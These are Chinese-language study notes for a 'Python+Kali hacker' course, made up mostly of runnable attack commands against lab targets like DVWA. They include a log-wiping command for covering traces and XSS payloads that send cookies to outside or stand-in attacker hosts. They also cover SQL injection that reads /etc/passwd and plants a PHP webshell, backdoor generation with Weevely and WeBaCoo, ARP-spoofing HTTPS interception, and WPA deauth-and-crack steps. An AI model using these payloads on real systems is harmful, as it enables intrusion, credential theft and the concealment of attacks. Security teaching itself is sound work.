# [乾颐堂](https://www.qytang.com/) Python+Kali 黑客全套教程

## 0x00 视频 + 源码 + PDF

- videos
  - [Python+Kali黑客全套教程，全程干货+实战技术，小白学习从入门到入狱](https://www.bilibili.com/video/BV17V4y157ih/?spm_id_from=333.337.search-card.all.click&vd_source=7f220845f0d7bc792a045e75a5ac8b8d)
  - [python+kali的全套黑客编程实践教程，全知识点+实践练习，（针对小白/python/kali/网络安全）](https://www.bilibili.com/video/BV1bG4y1H784/?spm_id_from=333.337.search-card.all.click&vd_source=7f220845f0d7bc792a045e75a5ac8b8d)
  - [Python+Kali黑客全套教程，全程干货+实战技术，小白学习从入门到入狱](https://www.bilibili.com/video/BV17V4y157ih/?vd_source=7f220845f0d7bc792a045e75a5ac8b8d#reply136957487232)

- 源码 + PDF

  需要 + up 主 wx

- PDF

  暂存本地 [python&kali 教程](待定)



## 0x01 简单记录

<!--last modify: 20230925-->

- 扫描工具

  ping  /  fping / nping / arping / nbtscan / onesixtyone

- python + nmap

  ```tex
  # https://pypi.org/project/python-nmap/
  # pip install python-nmap
  # import nmap
  ```

  - pypi 中有相关使用方法

- 痕迹清理

  ```shell
  del %WINDIR%\*.log /a/s/q/f # 强制静默删除只读文件
  ```

- nexpose api

  ```tex
  https://<host>:<port>/api/api-version/xml
  ```

- 协议攻击

  ```tex
  mac 泛洪 + mac 欺骗
      macof
      # 防御 port security 技术
  
  dhcp 攻击
      pig.py 干掉合法dhcp 服务器
      非法dhcp 服务器开始干活儿
      # 防御 dhcp snooping 技术
  
  arp 攻击
      arpspoof
      # 防御 DAI 技术
  
  dns spoofing
      ettercap # dns 欺骗
      set # 社会工程学
  ```

- windows 沙盒探测



- web 工具

  ```tex
  BurpSuite
  	Proxy 代理 / Intruder 攻击 / Repeater 重放
      Comparer 可比较两个不同请求页面的响应区别
      Spider 手工爬取+自动爬取
      Scanner 手工+自动
      Sequencer 自动确认Cookies 随机性
      Decoder + Extender 编/解码(绕过) + 扩展(WAF 绕过等)
  AppScan
  ```

- XSS POC & 攻击技巧

  ```tex
  # 手工改确认
  	1. 脚本：<script>alert('xss')</script> # <scr<Script>ipt>alert('xss')</script>
  	2. 超链接：<a href='' onclick=alert('xss')>click it</a>
  	3. 图片：<img src=http://172.16.1.23/a.jpgg onerror=alert('xss')>
  	4. 重定向：<script>window.location="http://www.testfire.net/index.jsp"</script>
  	5. iframe：<iframe width=300 height=100 src="http://dvwa.com/xss_vul/?name=<script>window.location='http://baidu.com/login_cookie.php?sid='%2Bdocumet.cookie;</script>"></iframe>
  	6. DOM：<script>document.body.ierHTML="<div style=visibility.visible;><br/><br/><h1>test</h1></div>";</script>
  
  # 攻击技巧
  	1. hook
  	2. keylogger
      /*
      1. 诱导受害者访问钓鱼网站
      2. 钓鱼网站触发访问目标(可信本地存在cookie)站点
      3. 触发本地PC 下载hook.js 文件
      4. 本地PC 运行hook.js 文件，获取cookie
      5. 发给hacker 站点，收集cookie
      6. hacker 站点以邮件形式发出
  
      http://target.vulhost.com/xss.php # 目标站点
      http://gofish.hack.net/index.jsp # 社工伪造钓鱼网站
      http://hook.hack.net/xss_hook.js # hook 站点
      http://collect.hack.net/xss_hook2email.php # 通过hook 站点收集信息的站点
      */
  
  # 注入点/注入位置
  [XSS 注入点](https://www.xjx100.cn/news/432525.html?action=onClick)
  # 常见绕过方式
  (替换)双写/大小写/转码
  # 存储型XSS
  前端表单长度限制，PC 端修改源码
  1 DOM 型XSS
  在URL 中符号'#' 后面的不会发送给服务端，但响应页面包含符号'#' 后内容且运行写入内容至PC 页面
  存在解码与否问题
  ```
  
- XSS 工具

  ```tex
  # xsser
      1. xsser -u "http://dvwa.com/vulnerabilities/xss_r/" -g "?name=" --cookie="PHPSESSID=h5btppesjqq99igfrc2lr24in4; security=low" -s -V --reverse-check # 反向检查
      2. xsser -u "http://dvwa.com/vulnerabilities/xss_r/" -g "?name=" --cookie="PHPSESSID=h5btppesjqq99igfrc2lr24in4; security=low" -s -V --heuristic # 检查
  
  # BeEF / beef-xss
  	Hooked 主机信息/键盘与鼠标记录查询/Commands 命令模块(颜色)
  	1. Get Cookie / 查表单填写内容 / 获取或修改页面超链接 / 弹出警告页面 / 查询Bug 软件 / 浏览器页面拍照 / 控制PC 进行DoS 等攻击 / 禁止关闭窗口 / 弹窗
  ```
  
- 密码破解

  ```tex
  # hash-identifier
  # john
  	john --format=raw-MD5 user_pass.txt --show
  ```

- SQL 注入

  ```tex
  # 读取服务器重要文件
  ' union select null, load_file('/etc/passwd') --+
  
  # 禁用PrivateTemp 功能
  # /usr/lib/systemd/system/mariadb.service
  # /user/lib/systemd/system/httpd.service
  # 修改PrivateTemp=off
  systemctl daemon-reload
  systemctl restart mariadb.service
  systemctl restart httpd.service
  
  # 写入文件
  ' union select null, "<?php passthru($_GET['cmd']); ?>" into dumpfile "/tmp/cmd.php" --+
  
  # 文件包含漏洞执行代码
  http://www.dvwa.com/vulnerabilities/fi/?page=/tmp/cmd.php&cmd=id
  
  # 防WAF 过滤对PHP 脚本进行转码
  <?php passthru($_GET['cmd']);?> # shell_cmd.php
  
  # 转16 进制
  echo "<?php passthru($_GET['cmd']);?>" |xxd -ps |tr -d '\n' # 3c3f706870207061737374687275285b27636d64275d293b3f3e0a
  
  # 注入
  ' union select null, (3c3f706870207061737374687275285b27636d64275d293b3f3e0a) into dumpfile "/tmp/cmd.php" --+
  
  # 文件包含漏洞执行代码
  http://www.dvwa.com/vulnerabilities/fi/?page=/tmp/cmd.php&cmd=id
  
  # 数据库写入文件
  ' union select null, concat(user, 0x3a, password) from users into outfile '/tmp/mysql.db' --+
  # 批量下载数据库
  http://www.dvwa.com/vulnerabilities/fi/?page=/tmp/mysql.db
  ```

- SQL 注入无权查询inforation_schema 表时

  ```tex
  # ' and column_name is null --+ # 猜列名
  select * from users where id = '' and column_name is null --+ # 如column_name 为username
  
  # ' or column_name='column_value # 猜列值，如列名user 中是否有admin
  # ' or column_name like '%char% # 猜列值，如列名user 中列值是否包含字符a
  # ' or column_name='column_value1' and column_value2='5f4dcc3b5aa765d61d8327deb882cf99 # 爆破密码，如已知列名user 和列值1 为admin，猜另一列值password 
  
  # ' and tables_name.column_name is null --+ # 猜表名
  select * from users where id = '' and tables_name.column_name is null --+ # 如tables_name.column_name 为users.username
  
  # ' and (select count(*) from tables_name) > 0 --+ # 猜表名，可暴露当前使用的数据库名
  ```
  
- CSRF 攻击

  ```tex
  # 关键性操作，二次验证；付款、改密等
  # BP 抓包右击》Engagement tools》Generate CSRF PoC (生成的HTML 视情况修改)
  
  # 攻击技巧
      1. 诱导受害者访问钓鱼网站
      2. 触发本地PC 下载hook.js 文件
      3. 本地PC 运行hook.js 文件，获取包含动态token 的cookie
      4. 利用包含动态token 的cookie 发起CSRF 攻击
  
  # 防御 & 辅助措施
  	1. 嵌入令牌/二次确认/Referer 确认
  	2. 发邮件/短信
  	
  # webshell
  	1. WeBaCoo // 通过Cookie 字段传输；cm 为base64 编码命令，cn 为服务器用于返回数据的cookie 名，cp 为返回信息定界符
  		webacoo -g -o backdoor_webacoo.php # -g 服务端脚本，-o 生成文件
  		webacoo -t -u http://target.vulhost.com/backdoor_webacoo.php # 上传文件至目标站点后进行连接
  	2. Weevely // 加密传输，有自带模块
  		weevely generate password backdoor_weevely.php # 生成带密码的后门
  		weevely http://target.vulhost.com/backdoor_weevely.php password # 上传文件至目标站点后进行连接
  		# 自带模块
  		help/system_info/audit_phpconf/backdoor_reversetcp/net_proxy/net_scan/
  ```

- HTTPS 探测技术

  ```
  # OpenSSL 安全套接字层密码库 包括密码算法、密钥、证书封装管理功能、SSL 协议
  openssl s_client -connect www.baidu.com:443 # 获取Server 信息 证书链/证书/Cipher-Suite(安全算法)/会话信息
  openssl s_client -tls1.2 -cipher 'ECDHE-RSA-AES128-GCM-SHA256' -connect www.baidu.com:443 # 使用特定Cipher-Suite 连接
  # 'ECDHE-RSA-AES128-GCM-SHA256' 格式：密钥交换-身份认证-数据加密-HASH 算法
  openssl s_client -tls1 -cipher "NULL,EXPORT,LOW,DES" -connect www.baidu.com:443 # 使用已知可被破解的Cipher-Suite 连接
  
  # SSLScan
  sslscan --tlsall www.baidu.com:443 # 所有TLS 版本相关信息
  sslscan --show-certificate --no-cippersuites www.baidu.com:443 # 详细分析证书
  ```

- HTTPS 工具

  ```shell
  # sslsplit HTTPS 中间人
  openssl genrsa -out ssl_mitm.key 2048 # 产生公钥
  openssl req -new -x509 -days 365 -key ssl_mitm.key -out ssl_mitm.crt # 产生CA 证书
  echo "1" > /proc/sys/net/ipv4/ip_forward # 激活路由转发
  iptables -L # 查看规则
  iptables -t nat -L # 查看NAT 规则
  iptables -t nat -F # 清空NAT 规则
  netstat -pantu |grep '80\|443' # 确认端口是否被占用
  iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-ports 8080 # 配置iptables 规则
  iptables -t nat -A PREROUTING -p tcp --dport 443 -j REDIRECT --to-ports 8443
  
  arpspoof -i eth0 -t $client_ip -r $server_ip # ARP 欺骗攻击
  sslsplit -D -l connect.log -j ./ssl_mitm/ -S ./ssl_mitm/logdir/ -k ssl_mitm.key -c ssl_mitm.crt ssl 0.0.0.0 8443 0.0.0.0 8080 # 激活中间人
  
  
  # sslstrip HTTPS 降HTTP
  iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-ports 8080
  iptables -t nat -A PREROUTING -p tcp --dport 443 -j REDIRECT --to-ports 8080 # 443 端口流量引到80
  arpspoof -i eth0 -t $client_ip -r $server_ip # ARP 欺骗攻击
  sslstrip -l 8080 # 激活sslstrip，仅支持一个端口
  python log_ex.py sslstrip.log -a -r # 读取并分析log 文件，python 2.x
  
  # HTTPS DoS 攻击
  ```

- 无线网络安全

  ```tex
  # WEP / WPA / WPA2
  # 密钥交换
  	1. 单播 成对传输密钥 PTK
  	2. 组播、广播 临时组密钥 GTK
  # 成对主密钥 PMK
  	1. 派生PTK、GTK；256 位hash 值；client 和AP 分别计算PMK，PMK 值不在网络中传输
  	2. PMK = hash(SSID + PSK + 4096) # SSID + 预共享密钥 + 4096 次迭代
  	3. PMK = WPA - PSK
  
  # 四次握手生成 PTK
  1. AP 传给 STA ANonce 随机数；# STA 生成 PTK
  2. AP 传给 AP SNonce 随机数，包含信息单元 MIC 值；# AP 生成 PTK
  3. AP PTK 加密发送 GTK，即 GTK + MIC
  4. STA Ack 确认
  
  # GTK 第一个 PC 连接时产生 GMK
  
  # deauthentication 技术/ deauth 技术
  # 攻击者发送 deauthentication 报文，打掉正常客户端，在客户端重新连接时获取四次握手报文
  # MIC -> PSK(字典爆破) -> PMK -> PTK ，即 MIC 与 PTK 有直接关系
  PTK = PMK + ANonce + SNonce + MAC1 + MAC2
  PMK = Hash(SSID + PSK + 4096)
  MIC = Hash(meg2 + DATA MIC)
  
  # KRACK 漏洞
  # 攻击者作为中间人，STA 与 AP 分别在不同信道
  1. 正常情况下 STA 发出 Ack 确认包后，STA 安装 PTK 与 GTK，AP 安装 PTK；
  2. 帧加密采用异或算法，两次异或使用相同 keystream 即可解密
  3. 中间人在 STA 发出 Ack 确认包时进行拦截，此时 STA 安装 PTK 与 GTK，开始加密传输数据；
  4. AP 未收到 Ack 包重发PTK 加密发送 GTK，即 GTK + MIC；
  5. STA 加密重发 Ack 确认包，重新安装 PTK 与 GTK；
  6. 利用两次 STA 的 Ack 确认包获得 keystream
  
  # Aircrack-ng
  ifconfig wlan0 up # 激活无线网卡
  iwconfig # 网卡的无线相关信息
  airmon-ng # 无线网卡驱动、芯片
  iw list # 无线网卡信息，重点关注 AP、monitor 功能
  airmon-ng check # 结束干扰进程
  airmon-ng check kill # 杀掉进程
  # service network-manager stop
  airmon-ng start wlan0 # 网卡切为 monitor 模式，网卡名称改变(wlan0mon)
  aireplay-ng -9 wlan0mon # 无线网卡包注入功能测试
  airmon-ng stop wlan0mon # 停用 monitor 模式，网卡会down，需手动重启
  airmon-ng start wlan0 1 # 让网卡进入 monitor 模式，且处于信道1
  iwlist wlan0mon channel # 查看无线网卡工作信道
  airodump-ng wlan0mon -c 1 # 抓取指定信道报文，等待出现 WPA handshake
  airodump-ng wlan0mon -c 1 --bssid D4:EE:07:54:7B:90 -w wpa_cap # 捕获保存特定 bssid 数据
  wireshark wps_cap-01.cap # 使用 Wireshark 打开包
  
  # WPA 攻击
  airodump-ng wlan0mon -c 1 # 窗口1：抓取信道1 的报文，获取AP 的MAC 地址
  airodump-ng wlan0mon -c 1 --bssid D4:EE:07:54:7B:90 -w wpa_cap # 捕获保存特定 bssid 数据
  aireplay-ng -0 2 -a $AP_MAC -c $STA_MAC wlan0mon # 窗口2：抓取握手报文，打断(deauth) 连接2次，使其重连；-0 表示deauth 攻击
  aircrack-ng -w usr/share/john/password.lst wpa_cap-01.cap # 字典爆破密码
  
  # Airolib-ng 工具：提前计算PMK 提速
  echo KALI_Wireless_JLY > essid.txt # 写入待破解 ESSID
  airolib-ng essid_db --import essid essid.txt # 创建数据，导入ESSID 文件信息
  airolib-ng essid_db --import passwd /usr/share/john/password.lst # 将字典文件导入数据库
  airolib-ng essid_db --stats # 查看数据库状态
  airolib-ng essid_db --batch # 开始计算PMK
  aircrack-ng -r essid_db wpa-01.cap # 加速破解
  
  # John / [号码号段查询](https://m.jihaoba.com/tools/haoduan/) phone_number_prefix.txt
  vim /etc/john/john.conf # 自定义动态规则
  ## Try the second half of split passwords
  -s x**
  -s-c x** M l Q
  $[0-9]$[0-9]$[0-9]$[0-9] # 动态产生电话号码后四位
  john --wordlist=phone_number_prefix.txt --rules -stdout # 使用密码规则输出动态规则
  airodump-ng wlan0mon -c 1 --bssid D4:EE:07:54:7B:90 -w wpa_phone # 窗口1：抓取握手报文
  aireplay-ng -0 2 -a $AP_MAC -c $STA_MAC wlan0mon # 窗口2：抓取握手报文，打断(deauth) 连接2次，使其重连；-0 表示deauth 攻击
  john --wordlist=phone_number_prefix.txt --rules -stdout |aircrack-ng -e KALI_Wireless_JLY -w - wpa_phone-01.cap # 利用动态输出破解密码
  
  # Rouge AP / WiFi-Pumpkin
  # 伪造AP 和中间人攻击
  # 下载与安装 https://github.com/P0cL4bs/WiFi-Pumpkin-deprecated(弃用)
  # https://github.com/P0cL4bs/wifipumpkin3
  wifi-pumpkin # 启用
  # Roue AP 配置：SSID/Channel/Enable Wireless Security/Activity Monitor settings/DHCP-Settings
  # 保存配置，开启Rouge AP，即Start
  # 客户端连接Rouge AP，获取IP 地址
  # 查看已连接客户端，即Stations
  # 客户端登录/访问HTTP 网站等
  # WiFi-Pumpkin 捕获：Images-Cap/Activity-Monitor(HTTP-Requests/HTTP-Authentication)
  ```
  
- python 中文解码

  ```tex
  # urllib3 request 后response.data 中出现乱码
  # 中文解码 GB18030 确认乱码是奇数，偶数为UTF-8
  ```

  
